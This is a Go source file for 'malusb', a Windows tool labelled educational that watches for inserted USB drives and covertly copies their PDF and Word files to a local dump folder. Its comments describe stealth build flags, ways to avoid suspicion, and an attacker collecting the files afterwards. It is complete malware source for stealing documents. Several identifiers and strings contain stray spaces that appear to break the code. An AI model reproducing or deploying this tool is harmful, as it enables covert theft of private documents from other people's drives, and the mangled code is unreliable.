// ============================================================================
// MALUSB - USB File Exfiltration Tool (Educational/Lab Use Only)
// ============================================================================
// Compatibility:  Windows only (uses kernel32.dll)
// Build Command: go build -ldflags="-w -s -H windowsgui" -o malusb. exe malusb. go
//
// Build Flags Explained:
//   -w            : Omit DWARF debug symbols (reduces binary size)
//   -s            :  Omit symbol table (makes reverse engineering harder)
//   -H windowsgui :  Compile as GUI app (no console window = stealth mode)
//
// To Stop:  Open Task Manager → Details → Find malusb.exe → End Task
// ============================================================================

package main

import (
	"fmt"           // Standard I/O formatting and printing
	"io"            // Core I/O primitives (Reader, Writer, Copy)
	"os"            // OS-level operations:  files, directories, env
	"path/filepath" // Cross-platform file path manipulation
	"strings"       // String operations (used for extension filtering)
	"syscall"       // Low-level OS calls (Windows API access)
	"time"          // Time operations:  durations, tickers, sleep
	"unsafe"        // Bypass Go's type safety for pointer operations (needed for syscalls)
)

// ============================================================================
// CONFIGURATION CONSTANTS
// ============================================================================
const (
	// DriveRemovable is the Windows API return value for removable drives
	// GetDriveType() returns:  0=Unknown, 1=NoRoot, 2=Removable, 3=Fixed, 4=Network, 5=CDROM, 6=RAMDisk
	DriveRemovable = 2

	// ScanInterval defines how often we check for newly inserted USB drives
	ScanInterval = 5 * time.Second

	// DumpDir is the local directory where exfiltrated files are stored
	// Attacker retrieves files from here after physical/remote access
	DumpDir = "C:\\USB_FETCHED\\"

	// FileScanInterval defines how often we scan monitored drives for new files
	FileScanInterval = 10 * time.Second

	// CopyTimeout is the maximum time allowed for copying a single file
	// Prevents hanging on locked/corrupted files
	CopyTimeout = 120 * time.Second

	// MaxFileSizeMB limits which files get copied (skip huge files to avoid suspicion)
	MaxFileSizeMB = 100
)

// ============================================================================
// GLOBAL STATE
// ============================================================================
var (
	// monitoredDrives tracks which drives are being watched and which files
	// have already been copied from each drive. 
	//
	// Structure: map[driveLetter] -> map[relativeFilePath] -> alreadyCopied(bool)
	//
	// Example:
	//   monitoredDrives["E:\\"]["Documents/secret.pdf"] = true
	//   monitoredDrives["E:\\"]["Photos/report.docx"] = true
	//
	// This prevents re-copying the same file on every scan cycle
	monitoredDrives = make(map[string]map[string]bool)

	// getDriveType is a handle to the Windows API function GetDriveTypeW
	// We use LazyDLL for deferred loading (DLL loads only when first called)
	// "W" suffix indicates Unicode (wide character) version of the function
	getDriveType = syscall.NewLazyDLL("kernel32.dll").NewProc("GetDriveTypeW")

	// targetExtensions defines which file types to exfiltrate
	// Only these extensions will be copied — everything else is ignored
	targetExtensions = map[string]bool{
		".pdf":   true, // PDF documents (reports, contracts, manuals)
		".docx": true, // Microsoft Word documents
	}
)

// ============================================================================
// MAIN FUNCTION - DAEMON ENTRY POINT
// ============================================================================
// main() starts an infinite loop that continuously scans for USB drives. 
// This is the "daemon" pattern — a background process that runs indefinitely
// without user interaction until manually terminated.
func main() {
	fmt.Printf("\n[*] malusb daemon started.. .\n")
	fmt.Printf("[*] Monitoring for USB drives.. .\n")
	fmt.Printf("[*] Target extensions: . pdf, .docx\n")
	fmt.Printf("[*] Dump directory: %s\n", DumpDir)

	// Infinite polling loop — checks for new USBs every ScanInterval
	for {
		checkUSBDrives()
		time.Sleep(ScanInterval) // Wait before next scan cycle
	}
}

// ============================================================================
// USB DETECTION FUNCTIONS
// ============================================================================

// checkUSBDrives scans all drive letters and identifies newly inserted USB drives. 
// When a new drive is detected, it spawns a goroutine to monitor that drive.
func checkUSBDrives() {
	// Get list of all currently connected removable drives
	drives := getRemovableDrives()

	for _, drive := range drives {
		// Check if we're already monitoring this drive
		// The underscore (_) discards the value; we only care if the key exists
		if _, exists := monitoredDrives[drive]; !exists {
			// New drive detected! 
			fmt.Printf("\n[+] USB inserted: %s\n", drive)

			// Initialize the file tracking map for this drive
			monitoredDrives[drive] = make(map[string]bool)

			// Spawn a concurrent goroutine to monitor this drive
			// "go" keyword creates a lightweight thread managed by Go runtime
			// Each USB gets its own goroutine — allows monitoring multiple USBs simultaneously
			go monitorUSB(drive)
		}
	}
}

// getRemovableDrives iterates through all possible Windows drive letters (A-Z)
// and returns a slice of drive paths that are removable (USB/SD card).
func getRemovableDrives() []string {
	var drives []string

	// Windows uses drive letters A-Z
	// We brute-force check each one (most won't exist)
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		// Format as Windows drive path:  "A:\", "B:\", etc.
		drivePath := fmt. Sprintf("%c:\\", drive)

		// Check if this drive exists and is removable
		if isRemovableDrive(drivePath) {
			drives = append(drives, drivePath)
		}
	}
	return drives
}

// isRemovableDrive calls the Windows API GetDriveTypeW to determine
// if a given drive path is a removable drive (USB, SD card, etc.)
func isRemovableDrive(drivePath string) bool {
	// Convert Go string to Windows UTF-16 format
	// Windows APIs use UTF-16 internally ("wide" characters)
	u16Path, _ := syscall. UTF16PtrFromString(drivePath)

	// Call Windows API:  GetDriveTypeW(lpRootPathName)
	// uintptr + unsafe.Pointer = raw memory address for C interop
	// Returns:  UINT drive type code
	ret, _, _ := getDriveType.Call(uintptr(unsafe. Pointer(u16Path)))

	// DriveRemovable (2) indicates USB/removable media
	return ret == DriveRemovable
}

// ============================================================================
// USB MONITORING FUNCTIONS
// ============================================================================

// monitorUSB continuously watches a USB drive for new files.
// Runs in its own goroutine — one per connected USB drive.
// Exits when the drive is physically removed.
func monitorUSB(drive string) {
	// Create destination folder:  C:\USB_FETCHED\E: \ (for drive E:)
	// filepath.Base extracts just "E:" from "E: \"
	destination := filepath.Join(DumpDir, filepath.Base(drive))

	// os.MkdirAll creates the directory and all parent directories
	// os.ModePerm = 0777 permissions (full access)
	os.MkdirAll(destination, os.ModePerm)

	fmt.Printf("[*] Monitoring drive %s for . pdf and .docx files...\n", drive)

	// Continuous monitoring loop
	for {
		// Check if drive still exists (hasn't been unplugged)
		// os.Stat returns error if path doesn't exist
		if _, err := os.Stat(drive); os.IsNotExist(err) {
			fmt. Printf("\n[-] Drive %s removed, stopping monitoring.\n", drive)

			// Cleanup: remove drive from tracking map
			delete(monitoredDrives, drive)

			// Exit this goroutine (return from function)
			return
		}

		// Scan for new files and copy them
		copyNewFiles(drive, destination)

		// Wait before next scan
		time.Sleep(FileScanInterval)
	}
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

// isTargetFile checks if a file has an extension we want to exfiltrate. 
// Returns true only for . pdf and .docx files.
func isTargetFile(filename string) bool {
	// filepath.Ext extracts extension including dot:  "report.pdf" -> ". pdf"
	ext := strings.ToLower(filepath.Ext(filename))

	// Check if extension exists in our target map
	return targetExtensions[ext]
}

// copyNewFiles walks through all files in srcDir recursively and copies
// new target files (. pdf, .docx) to destDir, preserving folder structure.
func copyNewFiles(srcDir, destDir string) {
	// filepath.Walk recursively traverses directory tree
	// Calls the anonymous function for each file/folder encountered
	filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		// Handle errors (permission denied, etc.) gracefully
		if err != nil {
			fmt.Printf("\n[!] Error accessing path: %v\n", err)
			return nil // Continue walking despite error
		}

		// Skip directories — we only care about files
		if info.IsDir() {
			return nil
		}

		// === EXTENSION FILTER ===
		// Only process . pdf and .docx files
		if ! isTargetFile(path) {
			return nil // Skip non-target files
		}

		// Skip files larger than MaxFileSizeMB (100 MB)
		// Large file copies are slow and create suspicious disk activity
		if info. Size() > MaxFileSizeMB*1024*1024 {
			fmt.Printf("\n[!] Skipping large file (%. 2f MB): %s\n",
				float64(info.Size())/(1024*1024), path)
			return nil
		}

		// Calculate relative path to preserve folder structure
		// E:\Documents\secret.pdf -> Documents\secret.pdf
		relPath, _ := filepath. Rel(srcDir, path)

		// Build full destination path
		// C:\USB_FETCHED\E:\Documents\secret.pdf
		destPath := filepath.Join(destDir, relPath)

		// Check if we've already copied this file
		// Prevents redundant copies on subsequent scan cycles
		if _, exists := monitoredDrives[srcDir][relPath]; exists {
			return nil // Already copied, skip
		}

		// Mark file as copied BEFORE copying (prevents race conditions)
		monitoredDrives[srcDir][relPath] = true

		// Create destination directory structure if it doesn't exist
		// filepath.Dir gets parent directory of file path
		os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

		// Log and copy the file
		fmt.Printf("\n[>] Copying: %s\n    -> %s\n", path, destPath)
		copyFileWithTimeout(path, destPath)

		return nil // Continue to next file
	})
}

// copyFileWithTimeout copies a file with a maximum time limit. 
// Uses goroutine + channel + select pattern for timeout handling.
//
// Why timeout?  Prevents hanging on: 
//   - Locked files (open in another program)
//   - Corrupted files
//   - Very slow USB drives
func copyFileWithTimeout(src, dest string) {
	// Create a channel to signal when copy is done
	// Channels are Go's primary mechanism for goroutine communication
	done := make(chan bool)

	// Spawn goroutine to perform the actual copy
	go func() {
		// Open source file for reading
		srcFile, err := os.Open(src)
		if err != nil {
			fmt.Printf("[!] Failed to open source:  %v\n", err)
			done <- false
			return
		}
		defer srcFile.Close() // Ensure file is closed when function exits

		// Create destination file for writing
		destFile, err := os.Create(dest)
		if err != nil {
			fmt.Printf("[!] Failed to create destination: %v\n", err)
			done <- false
			return
		}
		defer destFile.Close()

		// io.Copy streams data from reader to writer
		// Efficient:  doesn't load entire file into memory
		io.Copy(destFile, srcFile)

		fmt.Printf("[+] Copied successfully: %s\n", filepath.Base(src))
		done <- true // Signal completion
	}()

	// select waits on multiple channel operations
	// Whichever happens first "wins"
	select {
	case <-done:
		// Copy completed (successfully or with error)
		return
	case <-time.After(CopyTimeout):
		// 2 minutes passed — timeout triggered
		fmt.Printf("[!] Copy timed out:  %s\n", src)
		// Note: The goroutine may still be running (potential resource leak)
		// Production code should implement proper cancellation
	}
}
